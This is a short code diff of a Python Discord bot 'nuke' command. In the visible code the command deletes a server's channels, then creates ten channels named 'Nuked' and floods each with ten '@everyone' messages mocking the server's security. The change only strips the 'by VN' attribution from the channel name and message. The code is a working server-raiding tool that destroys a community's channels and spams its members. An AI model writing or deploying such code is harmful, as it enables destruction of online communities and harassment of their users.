@@ -32,9 +32,9 @@ async def nuke(ctx):
             print(f"Deleted channel: {channel.name}")
 
     async def create_channel(i):
-        channel = await ctx.guild.create_text_channel("💣 Nuked by VN")
+        channel = await ctx.guild.create_text_channel("💣 Nuked")
         for _ in range(10):
-            await channel.send("> 🥱 @everyone GET A SECURITY BOT CUZ THIS SERVER JUST GOT NUKED BY VN 🥱")
+            await channel.send("> 🥱 @everyone GET A SECURITY BOT CUZ THIS SERVER JUST GOT NUKED 🥱")
 
     await asyncio.gather(*[create_channel(i) for i in range(10)])
 
